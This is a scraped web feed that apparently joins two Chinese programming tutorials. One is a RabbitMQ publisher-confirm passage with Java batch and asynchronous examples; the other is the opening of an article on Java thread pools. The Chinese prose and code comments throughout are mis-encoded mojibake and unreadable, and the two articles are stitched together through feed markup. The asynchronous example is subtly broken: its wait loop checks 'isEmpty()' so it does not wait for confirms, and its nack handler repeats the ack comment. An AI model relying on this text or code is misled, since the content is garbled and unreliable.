<h3 data-id="heading-17"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.2 Publishing Messages in Batches(æ‰¹é‡ç¡®è®¤)</h3>
<p>æ¯å‘é€â¼€æ‰¹æ¶ˆæ¯å,è°ƒâ½¤ channel.waitForConfirms â½…æ³•ï¼Œç­‰å¾…æœåŠ¡å™¨çš„ç¡®è®¤è¿”å›ã€‚</p>
<p>è·Ÿå•ç‹¬ç¡®è®¤åŒºåˆ«å°±æ˜¯ï¼Œå‘é€åˆ°ä¸€å®šæ¶ˆæ¯å†è¿›è¡Œç­‰å¾…ç¡®è®¤ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">    private static void publishingMessagesInBatches()throws IOException, TimeoutException, InterruptedException  {
        try (Channel <span class="hljs-attr">channel</span> = createChannel()){
            //è®¾ç½®ä¿¡é“ä¸ºconfirmæ¨¡å¼
            channel.confirmSelect()<span class="hljs-comment">;</span>
            //å£°æ˜é˜Ÿåˆ—
            channel.queueDeclare("publish.confirm.queue2",true,false,false,null)<span class="hljs-comment">;</span>
            long <span class="hljs-attr">start</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
            //å‘é€æ¶ˆæ¯
            int <span class="hljs-attr">batchSize</span> = <span class="hljs-number">100</span><span class="hljs-comment">;</span>
            int <span class="hljs-attr">flag</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 200; i++) {</span>
                String <span class="hljs-attr">msg</span> = <span class="hljs-string">"Publishing Messages in Batches "</span> + i<span class="hljs-comment">;</span>
                channel.basicPublish("","publish.confirm.queue2",null,msg.getBytes())<span class="hljs-comment">;</span>
                //æ‰¹é‡ ç­‰å¾…ç¡®è®¤
                if(<span class="hljs-attr">flag</span> == batchSize) {
                    channel.waitForConfirmsOrDie(5000)<span class="hljs-comment">;</span>
                    <span class="hljs-attr">flag</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
                }
                flag++<span class="hljs-comment">;</span>
            }
            if(flag &gt; 0) {
                channel.waitForConfirmsOrDie(5000)<span class="hljs-comment">;</span>
            }
            long <span class="hljs-attr">end</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>

            System.out.println("Publishing Messages in Batches(æ‰¹é‡ç¡®è®¤) å‘é€200æ¡æ¶ˆæ¯è€—æ—¶ "+ (end - start))<span class="hljs-comment">;</span>
        }
    }

AIå†™ä»£ç java
è¿è¡Œ
12345678910111213141516171819202122232425262728
</code></pre>
<p>ç»“æœï¼š<br/>
<img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/ee3837a8c39d46afa4e8ccb2f345b2f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=KCaMtGqFkuarFAw0PYiRZl%2BT1SU%3D" alt="&#10;" loading="lazy"/></p>
<p>ç›¸â½äºå•ç‹¬ç¡®è®¤ç­–ç•¥ï¼Œæ‰¹é‡ç¡®è®¤æâ¼¤åœ°æå‡äº†confirmçš„æ•ˆç‡ï¼Œ<br/>
ç¼ºç‚¹æ˜¯å‡ºç°Basic.Nackæˆ–è€…è¶…æ—¶æ—¶ï¼Œæˆ‘ä»¬ä¸æ¸…æ¥šå…·ä½“å“ªæ¡æ¶ˆæ¯å‡ºäº†é—®é¢˜ã€‚å®¢â¼¾ç«¯éœ€è¦å°†è¿™â¼€æ‰¹æ¬¡çš„æ¶ˆæ¯å…¨éƒ¨é‡å‘ï¼Œè¿™ä¼šå¸¦æ¥æ˜æ˜¾çš„é‡å¤æ¶ˆæ¯æ•°é‡ã€‚<br/>
å½“æ¶ˆæ¯ç»å¸¸ä¸¢å¤±æ—¶ï¼Œæ‰¹é‡ç¡®è®¤çš„æ€§èƒ½åº”è¯¥æ˜¯ä¸å‡åé™çš„ã€‚</p>
<h3 data-id="heading-18"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.3 Handling Publisher Confirms Asynchronously(å¼‚æ­¥ç¡®è®¤)</h3>
<p>æä¾›â¼€ä¸ªå›è°ƒâ½…æ³•,æœåŠ¡ç«¯ç¡®è®¤äº†â¼€æ¡æˆ–è€…å¤šæ¡æ¶ˆæ¯åå®¢â¼¾ç«¯ä¼šå›è¿™ä¸ªâ½…æ³•è¿›â¾å¤„ç†ã€‚</p>
<p>å¼‚æ­¥confirmâ½…æ³•çš„ç¼–ç¨‹å®ç°æœ€ä¸ºå¤æ‚ã€‚Channel æ¥â¼æä¾›äº†â¼€ä¸ªâ½…æ³• addConfirmListenerï¼Œè¿™ä¸ªâ½…æ³•å¯ä»¥æ·»åŠ ConfirmListener å›è°ƒæ¥â¼ã€‚</p>
<p>ConfirmListener æ¥â¼ä¸­åŒ…å«ä¸¤ä¸ªâ½…æ³•ï¼š<code>handleAck(long deliveryTag, boolean multiple)Â </code>å’ŒÂ <code>handleNack(long deliveryTag, boolean multiple)</code>Â ,åˆ†åˆ«å¯¹åº”å¤„ç†RabbitMQå‘é€ç»™â½£äº§è€…çš„ ack å’Œ nackã€‚</p>
<p>deliveryTag è¡¨â½°å‘é€æ¶ˆæ¯çš„åºå·ï¼Œmultiple è¡¨â½°æ˜¯å¦æ‰¹é‡ç¡®è®¤ã€‚æˆ‘ä»¬éœ€è¦ä¸ºæ¯â¼€ä¸ªChannel ç»´æŠ¤â¼€ä¸ªå·²å‘é€æ¶ˆæ¯çš„åºå·é›†åˆã€‚<br/>
å½“æ”¶åˆ°RabbitMQçš„confirm å›è°ƒæ—¶ï¼Œä»é›†åˆä¸­åˆ é™¤å¯¹åº”çš„æ¶ˆæ¯ã€‚å½“Channelå¼€å¯confirmæ¨¡å¼åï¼Œchannelä¸Šå‘é€æ¶ˆæ¯éƒ½ä¼šé™„å¸¦â¼€ä¸ªä»1å¼€å§‹é€’å¢çš„deliveryTagåºå·ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿â½¤SortedSet çš„æœ‰åºæ€§æ¥ç»´æŠ¤è¿™ä¸ªå·²å‘æ¶ˆæ¯çš„é›†åˆã€‚</p>
<ol>
<li>å½“æ”¶åˆ°ackæ—¶ï¼Œä»åºåˆ—ä¸­åˆ é™¤è¯¥æ¶ˆæ¯çš„åºå·ã€‚å¦‚æœä¸ºæ‰¹é‡ç¡®è®¤æ¶ˆæ¯ï¼Œè¡¨â½°â¼©äºç­‰äºå½“å‰åºå·deliveryTagçš„æ¶ˆæ¯éƒ½æ”¶åˆ°äº†ï¼Œåˆ™æ¸…é™¤å¯¹åº”é›†åˆ</li>
<li>å½“æ”¶åˆ°nackæ—¶ï¼Œå¤„ç†é€»è¾‘ç±»ä¼¼ï¼Œä¸è¿‡éœ€è¦ç»“åˆå…·ä½“çš„ä¸šåŠ¡æƒ…å†µï¼Œè¿›â¾æ¶ˆæ¯é‡å‘ç­‰æ“ä½œã€‚</li>
</ol>

<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handlingPublisherConfirmsAsynchronously</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException, InterruptedException  {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> createChannel()){
            <span class="hljs-comment">//è®¾ç½®ä¿¡é“ä¸ºconfirmæ¨¡å¼</span>
            channel.confirmSelect();
            <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span>
            channel.queueDeclare(<span class="hljs-string">"publish.confirm.queue3"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
            <span class="hljs-comment">//æœ‰åºé›†åˆ,å…ƒç´ æŒ‰ç…§â¾ƒç„¶é¡ºåºè¿›â¾æ’åº,å­˜å‚¨æœªconfirmæ¶ˆæ¯åºå·</span>
            SortedSet&lt;Long&gt; confirmSet = Collections.synchronizedSortedSet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>&lt;&gt;());
            <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
            <span class="hljs-comment">//ç›‘å¬</span>
            channel.addConfirmListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConfirmListener</span>() {
                <span class="hljs-meta">@Override</span>
                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleAck</span><span class="hljs-params">(<span class="hljs-type">long</span> deliveryTag, <span class="hljs-type">boolean</span> multiple)</span> <span class="hljs-keyword">throws</span> IOException {
                    <span class="hljs-comment">//æ‰¹é‡ç¡®è®¤:å°†é›†åˆä¸­â¼©äºç­‰äºå½“å‰åºå·deliveryTagå…ƒç´ çš„é›†åˆæ¸…é™¤ï¼Œè¡¨â½°è¿™æ‰¹åºå·çš„æ¶ˆæ¯éƒ½å·²ç»è¢«ackäº†</span>
                    <span class="hljs-keyword">if</span>(multiple) {
                        confirmSet.headSet(deliveryTag+<span class="hljs-number">1</span>).clear();
                    }<span class="hljs-keyword">else</span> { <span class="hljs-comment">//å•ç‹¬ç¡®è®¤</span>
                        confirmSet.remove(deliveryTag);
                    }
                }

                <span class="hljs-meta">@Override</span>
                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleNack</span><span class="hljs-params">(<span class="hljs-type">long</span> deliveryTag, <span class="hljs-type">boolean</span> multiple)</span> <span class="hljs-keyword">throws</span> IOException {
                    <span class="hljs-comment">//æ‰¹é‡ç¡®è®¤:å°†é›†åˆä¸­â¼©äºç­‰äºå½“å‰åºå·deliveryTagå…ƒç´ çš„é›†åˆæ¸…é™¤ï¼Œè¡¨â½°è¿™æ‰¹åºå·çš„æ¶ˆæ¯éƒ½å·²ç»è¢«ackäº†</span>
                    <span class="hljs-keyword">if</span>(multiple) {
                        confirmSet.headSet(deliveryTag+<span class="hljs-number">1</span>).clear();
                    }<span class="hljs-keyword">else</span> { <span class="hljs-comment">//å•ç‹¬ç¡®è®¤</span>
                        confirmSet.remove(deliveryTag);
                    }

                    <span class="hljs-comment">//æ ¹æ®ä¸šåŠ¡å¤„ç†</span>

                }
            });
            <span class="hljs-comment">//å‘é€æ¶ˆæ¯</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">200</span>; i++) {
                <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Handling Publisher Confirms Asynchronously "</span> + i;
                <span class="hljs-comment">//å¾—åˆ°ä¸‹æ¬¡å‘é€æ¶ˆæ¯çš„åºå·, ä»1å¼€å§‹</span>
                <span class="hljs-type">long</span> <span class="hljs-variable">nextPublishSeqNo</span> <span class="hljs-operator">=</span> channel.getNextPublishSeqNo();
                channel.basicPublish(<span class="hljs-string">""</span>,<span class="hljs-string">"publish.confirm.queue3"</span>,<span class="hljs-literal">null</span>,msg.getBytes());
                <span class="hljs-comment">//å­˜å…¥é›†åˆ</span>
                confirmSet.add(nextPublishSeqNo);
            }
            <span class="hljs-keyword">while</span>(confirmSet.isEmpty()) {
                Thread.sleep(<span class="hljs-number">20</span>);
            }
            <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();

            System.out.println(<span class="hljs-string">"Handling Publisher Confirms Asynchronously(å¼‚æ­¥ç¡®è®¤) å‘é€200æ¡æ¶ˆæ¯è€—æ—¶ "</span>+ (end - start));
        }
    }

AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152</span>
</code></pre>
<p>ç»“æœï¼š<br/>
<img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/94b945072db446f9afe52793f2b1f15c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937423&amp;x-orig-sign=UM4Be3OoybqfQwcoF4QJQ6YiIJ4%3D" alt="&#10;" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaå¹¶å‘ç¼–ç¨‹é«˜çº§ï¼ˆçº¿ç¨‹æ± Â·Executoræ¡†æ¶Â·å¹¶å‘é›†åˆ)]]></title>    <link>https://juejin.cn/post/7592540388298293311</link>    <guid>https://juejin.cn/post/7592540388298293311</guid>    <pubDate>2026-01-08T04:02:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592540388298293311" data-draft-id="7592508079305687059" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaå¹¶å‘ç¼–ç¨‹é«˜çº§ï¼ˆçº¿ç¨‹æ± Â·Executoræ¡†æ¶Â·å¹¶å‘é›†åˆ)"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,Android"/> <meta itemprop="datePublished" content="2026-01-08T04:02:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’è²843"/> <meta itemprop="url" content="https://juejin.cn/user/541408646929991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaå¹¶å‘ç¼–ç¨‹é«˜çº§ï¼ˆçº¿ç¨‹æ± Â·Executoræ¡†æ¶Â·å¹¶å‘é›†åˆ)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/541408646929991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’è²843
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T04:02:39.000Z" title="Thu Jan 08 2026 04:02:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»57åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. çº¿ç¨‹æ± ï¼ˆThreadPoolExecutorï¼‰</h2>
<h4 data-id="heading-1">1.1 çº¿ç¨‹æ± æ¦‚è¿°</h4>
<h5 data-id="heading-2">1.1.1 ä¸ºä»€ä¹ˆä½¿ç”¨çº¿ç¨‹æ± </h5>
<p>åœ¨å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­ï¼Œé¢‘ç¹åœ°åˆ›å»ºå’Œé”€æ¯çº¿ç¨‹ä¼šå¸¦æ¥å¾ˆå¤§çš„æ€§èƒ½å¼€é”€ã€‚çº¿ç¨‹æ± é€šè¿‡å¤ç”¨å·²åˆ›å»ºçš„çº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡ï¼Œé¿å…äº†çº¿ç¨‹åˆ›å»ºå’Œé”€æ¯çš„å¼€é”€ï¼Œæé«˜äº†ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚</p>
<p><strong>çº¿ç¨‹æ± çš„ä¸»è¦ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>é™ä½èµ„æºæ¶ˆè€—</strong>ï¼šé€šè¿‡å¤ç”¨å·²åˆ›å»ºçš„çº¿ç¨‹ï¼Œå‡å°‘çº¿ç¨‹åˆ›å»ºå’Œé”€æ¯çš„å¼€é”€</li>
<li><strong>æé«˜å“åº”é€Ÿåº¦</strong>ï¼šä»»åŠ¡åˆ°è¾¾æ—¶ï¼Œæ— éœ€ç­‰å¾…çº¿ç¨‹åˆ›å»ºå³å¯ç«‹å³æ‰§è¡Œ</li>
<li><strong>æé«˜çº¿ç¨‹çš„å¯ç®¡ç†æ€§</strong>ï¼šå¯ä»¥å¯¹çº¿ç¨‹è¿›è¡Œç»Ÿä¸€ç®¡ç†ã€ç›‘æ§å’Œè°ƒä¼˜</li>
<li><strong>æ§åˆ¶å¹¶å‘æ•°é‡</strong>ï¼šå¯ä»¥é™åˆ¶åŒæ—¶æ‰§è¡Œçš„çº¿ç¨‹æ•°é‡ï¼Œé˜²æ­¢ç³»ç»Ÿèµ„æºè€—å°½</li>
</ul>
<h5 data-id="heading-3">1.1.2 çº¿ç¨‹æ± çš„æ ¸å¿ƒå‚æ•°</h5>
<p>çº¿ç¨‹æ± çš„æ ¸å¿ƒå‚æ•°å†³å®šäº†çº¿ç¨‹æ± çš„è¡Œä¸ºå’Œæ€§èƒ½ï¼Œä¸»è¦åŒ…æ‹¬ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹æ± çš„7ä¸ªæ ¸å¿ƒå‚æ•°</span>
ThreadPoolExecutor(
    <span class="hljs-type">int</span> corePoolSize,              <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹æ•°</span>
    <span class="hljs-type">int</span> maximumPoolSize,           <span class="hljs-comment">// æœ€å¤§çº¿ç¨‹æ•°</span>
    <span class="hljs-type">long</span> keepAliveTime,            <span class="hljs-comment">// çº¿ç¨‹å­˜æ´»æ—¶é—´</span>
    TimeUnit unit,                 <span class="hljs-comment">// æ—¶é—´å•ä½</span>
    BlockingQueue&lt;Runnable&gt; workQueue,  <span class="hljs-comment">// å·¥ä½œé˜Ÿåˆ—</span>
    ThreadFactory threadFactory,   <span class="hljs-comment">// çº¿ç¨‹å·¥å‚</span>
    RejectedExecutionHandler handler     <span class="hljs-comment">// æ‹’ç»ç­–ç•¥</span>
)
</code></pre>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>corePoolSize</code>ï¼šæ ¸å¿ƒçº¿ç¨‹æ•°ï¼Œå³ä½¿çº¿ç¨‹ç©ºé—²ä¹Ÿä¼šä¿ç•™çš„çº¿ç¨‹æ•°é‡</li>
<li><code>maximumPoolSize</code>ï¼šæœ€å¤§çº¿ç¨‹æ•°ï¼Œçº¿ç¨‹æ± å…è®¸åˆ›å»ºçš„æœ€å¤§çº¿ç¨‹æ•°é‡</li>
<li><code>keepAliveTime</code>ï¼šéæ ¸å¿ƒçº¿ç¨‹çš„ç©ºé—²å­˜æ´»æ—¶é—´</li>
<li><code>unit</code>ï¼šæ—¶é—´å•ä½ï¼Œå¦‚ç§’ã€æ¯«ç§’ç­‰</li>
<li><code>workQueue</code>ï¼šå·¥ä½œé˜Ÿåˆ—ï¼Œç”¨äºå­˜æ”¾å¾…æ‰§è¡Œçš„ä»»åŠ¡</li>
<li><code>threadFactory</code>ï¼šçº¿ç¨‹å·¥å‚ï¼Œç”¨äºåˆ›å»ºæ–°çº¿ç¨‹</li>
<li><code>handler</code>ï¼šæ‹’ç»ç­–ç•¥ï¼Œå½“çº¿ç¨‹æ± æ— æ³•æ¥å—æ–°ä»»åŠ¡æ—¶çš„å¤„ç†æ–¹å¼</li>
</ul>
<h4 data-id="heading-4">1.2 ThreadPoolExecutorè¯¦è§£</h4>
<h5 data-id="heading-5">1.2.1 æ ¸å¿ƒå‚æ•°è¯¦è§£</h5>
<p><strong>1. corePoolSizeï¼ˆæ ¸å¿ƒçº¿ç¨‹æ•°ï¼‰</strong></p>
<p>æ ¸å¿ƒçº¿ç¨‹æ•°æ˜¯çº¿ç¨‹æ± ä¸­å§‹ç»ˆä¿æŒå­˜æ´»çš„çº¿ç¨‹æ•°é‡ã€‚å³ä½¿è¿™äº›çº¿ç¨‹å¤„äºç©ºé—²çŠ¶æ€ï¼Œä¹Ÿä¸ä¼šè¢«é”€æ¯ã€‚æ ¸å¿ƒçº¿ç¨‹æ•°åº”è¯¥æ ¹æ®ä»»åŠ¡çš„ç±»å‹å’Œç³»ç»Ÿèµ„æºæ¥è®¾ç½®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¤ºä¾‹ï¼šåˆ›å»ºæ ¸å¿ƒçº¿ç¨‹æ•°ä¸º5çš„çº¿ç¨‹æ± </span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>,  <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹æ•°ï¼šå§‹ç»ˆä¿æŒ5ä¸ªçº¿ç¨‹</span>
    <span class="hljs-number">10</span>, <span class="hljs-comment">// æœ€å¤§çº¿ç¨‹æ•°</span>
    <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>)
);
</code></pre>
<p><strong>2. maximumPoolSizeï¼ˆæœ€å¤§çº¿ç¨‹æ•°ï¼‰</strong></p>
<p>æœ€å¤§çº¿ç¨‹æ•°æ˜¯çº¿ç¨‹æ± å…è®¸åˆ›å»ºçš„æœ€å¤§çº¿ç¨‹æ•°é‡ã€‚å½“å·¥ä½œé˜Ÿåˆ—å·²æ»¡ä¸”å½“å‰çº¿ç¨‹æ•°å°äºæœ€å¤§çº¿ç¨‹æ•°æ—¶ï¼Œçº¿ç¨‹æ± ä¼šåˆ›å»ºæ–°çº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡ã€‚</p>
<p><strong>3. keepAliveTimeï¼ˆçº¿ç¨‹å­˜æ´»æ—¶é—´ï¼‰</strong></p>
<p>å½“çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ•°é‡è¶…è¿‡æ ¸å¿ƒçº¿ç¨‹æ•°æ—¶ï¼Œå¤šä½™çš„ç©ºé—²çº¿ç¨‹åœ¨ç­‰å¾…æ–°ä»»åŠ¡æ—¶çš„æœ€å¤§å­˜æ´»æ—¶é—´ã€‚è¶…è¿‡è¿™ä¸ªæ—¶é—´ï¼Œç©ºé—²çº¿ç¨‹å°†è¢«å›æ”¶ã€‚</p>
<p><strong>4. workQueueï¼ˆå·¥ä½œé˜Ÿåˆ—ï¼‰</strong></p>
<p>å·¥ä½œé˜Ÿåˆ—ç”¨äºå­˜æ”¾å¾…æ‰§è¡Œçš„ä»»åŠ¡ã€‚å¸¸ç”¨çš„é˜Ÿåˆ—ç±»å‹æœ‰ï¼š</p>
<ul>
<li><code>ArrayBlockingQueue</code>ï¼šåŸºäºæ•°ç»„çš„æœ‰ç•Œé˜»å¡é˜Ÿåˆ—</li>
<li><code>LinkedBlockingQueue</code>ï¼šåŸºäºé“¾è¡¨çš„é˜»å¡é˜Ÿåˆ—ï¼ˆå¯è®¾ç½®å®¹é‡ï¼‰</li>
<li><code>SynchronousQueue</code>ï¼šä¸å­˜å‚¨å…ƒç´ çš„é˜»å¡é˜Ÿåˆ—</li>
<li><code>PriorityBlockingQueue</code>ï¼šå…·æœ‰ä¼˜å…ˆçº§çš„é˜»å¡é˜Ÿåˆ—</li>
</ul>
